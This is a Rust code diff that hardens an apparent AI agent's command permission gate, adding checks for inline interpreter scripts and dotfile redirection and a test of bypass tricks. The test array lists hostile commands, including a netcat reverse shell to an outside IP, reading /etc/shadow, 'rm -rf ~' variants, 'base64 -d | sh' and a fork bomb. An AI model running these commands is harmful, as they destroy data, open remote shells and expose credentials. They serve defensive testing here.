@@ -95,7 +95,17 @@ impl PermissionGate {
                 return PermissionDecision::Allow;
             }
 
-            // Split compound chained commands (e.g. "git status; rm -rf ~" or "cargo test && /bin/sh")
+            // 1. Audit the ENTIRE unsplit command string for pipeline, redirection, and composite risks
+            if let Some((risk, reason)) = SecurityPolicy::scan_command_risk(cmd) {
+                return PermissionDecision::Prompt {
+                    reason: reason.to_string(),
+                    details: format!("Command: {}", cmd),
+                    risk_level: risk,
+                    suggest_trust_path: None,
+                };
+            }
+
+            // 2. Split compound chained commands (e.g. "git status; rm -rf ~" or "cargo test && /bin/sh")
             let sub_cmds = SecurityPolicy::split_command_chain(cmd);
 
             // Audit EVERY sub-command for high/critical risk patterns
@@ -108,6 +118,29 @@ impl PermissionGate {
                         suggest_trust_path: None,
                     };
                 }
+            }
+
+            // In sandboxed mode, explicitly challenge inline scripts (-c / -e / eval) and dotfile redirects
+            let lower_cmd = cmd.to_lowercase();
+            if lower_cmd.contains(" -c ")
+                || lower_cmd.contains(" -e ")
+                || lower_cmd.contains(" -command ")
+                || lower_cmd.starts_with("python -c")
+                || lower_cmd.starts_with("python3 -c")
+                || lower_cmd.starts_with("node -e")
+                || lower_cmd.starts_with("perl -e")
+                || lower_cmd.starts_with("ruby -e")
+                || lower_cmd.starts_with("eval ")
+                || lower_cmd.contains(" eval ")
+                || lower_cmd.contains("> ~")
+                || lower_cmd.contains(">> ~")
+            {
+                return PermissionDecision::Prompt {
+                    reason: "Inline interpreter script execution or dotfile redirection (-c / -e / eval)".to_string(),
+                    details: format!("Command: {}", cmd),
+                    risk_level: RiskLevel::High,
+                    suggest_trust_path: None,
+                };
             }
 
             if self.session_allowed_commands.contains(cmd) {
@@ -948,5 +981,46 @@ mod tests {
         }
 
         let _ = std::fs::remove_dir_all(&temp);
+    }
+
+    #[test]
+    fn test_gate_sandboxed_mode_challenges_all_interpreters_and_shell_tricks() {
+        let gate = PermissionGate::new(Some(SecurityMode::Sandboxed));
+        let workspace = PathBuf::from("/workspace");
+
+        let tricks = [
+            "python3 -c \"os.system('rm -rf ~')\"",
+            "node -e \"console.log(process.mainModule)\"",
+            "perl -e \"exec('/bin/sh')\"",
+            "eval \"rm -rf ~\"",
+            "X=rm; $X -rf ~",
+            "base64 -d | sh",
+            "xargs rm -rf",
+            "mv ~ /dev/null",
+            "> ~/.bashrc",
+            ">> ~/.zshrc",
+            "nc -e /bin/sh 1.2.3.4 8080",
+            "cat /etc/shadow",
+            ":(){ :|:& };:",
+        ];
+
+        for cmd in tricks {
+            let args = json!({ "command": cmd });
+            let decision = gate.evaluate("run_command", &args, &workspace);
+            match decision {
+                PermissionDecision::Prompt { risk_level, .. } => {
+                    assert!(
+                        risk_level == RiskLevel::High || risk_level == RiskLevel::Critical,
+                        "Expected High or Critical prompt for trick '{}', got {:?}",
+                        cmd,
+                        risk_level
+                    );
+                }
+                other => panic!(
+                    "Command trick '{}' bypassed sandboxed gate! Returned: {:?}",
+                    cmd, other
+                ),
+            }
+        }
     }
 }
